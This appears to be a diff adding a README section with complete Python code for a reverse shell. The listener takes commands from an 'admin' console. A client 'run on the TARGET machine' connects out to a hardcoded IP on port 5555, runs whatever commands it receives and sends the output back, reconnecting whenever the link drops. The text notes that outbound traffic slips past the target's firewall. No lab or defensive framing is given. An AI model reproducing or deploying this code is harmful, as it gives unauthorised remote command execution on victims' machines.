@@ -65,3 +65,85 @@ Check if the port (5555) is listening:
 ```
 
 
+
+## `server.py`
+- This listens for incoming connections on port `5555`
+- Firewall must allow inbound connections on port `5555`
+  
+Example PowerShell command to allow the port:
+```bash
+New-NetFirewallRule -DisplayName "PythonTest" -Direction Inbound -LocalPort 5555 -Protocol TCP -Action Allow
+```
+
+```python
+# server.py
+# server.py - Run on the ADMIN machine
+import socket
+
+def start_server():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", 5555))  # Listen on all network interfaces
+    s.listen(1)
+    print("[*] Waiting for connection...")
+    
+    conn, addr = s.accept()
+    print(f"[+] Connected to {addr}")
+    
+    try:
+        while True:
+            cmd = input("admin$ ")
+            if cmd.lower() == 'exit':
+                conn.send(cmd.encode())
+                break
+            conn.send(cmd.encode())
+            print(conn.recv(4096).decode())  # Larger buffer for big outputs
+    finally:
+        conn.close()
+        s.close()
+
+if __name__ == "__main__":
+    start_server()
+
+```
+
+## `client.py `
+- The client initiates the connection to the `server’s IP` (208.8.8.140)
+- No need to disable the client’s firewall (outbound connections are usually allowed by default).
+
+
+```python
+# client.py
+
+# client.py - Run on the TARGET machine
+import socket
+import subprocess
+
+def connect_to_server(server_ip, port):
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((server_ip, port))
+            print(f"[*] Connected to {server_ip}")
+            
+            while True:
+                command = s.recv(4096).decode().strip()
+                if command.lower() == 'exit':
+                    s.close()
+                    break
+                
+                try:
+                    output = subprocess.getoutput(command)
+                    s.send(output.encode())
+                except Exception as e:
+                    s.send(f"Error: {str(e)}".encode())
+                    
+        except (ConnectionError, socket.error):
+            print("[!] Connection lost. Reconnecting...")
+            continue
+
+if __name__ == "__main__":
+    SERVER_IP = "208.8.8.140"  # Change to the server's real IP
+    PORT = 5555
+    connect_to_server(SERVER_IP, PORT)
+
+```
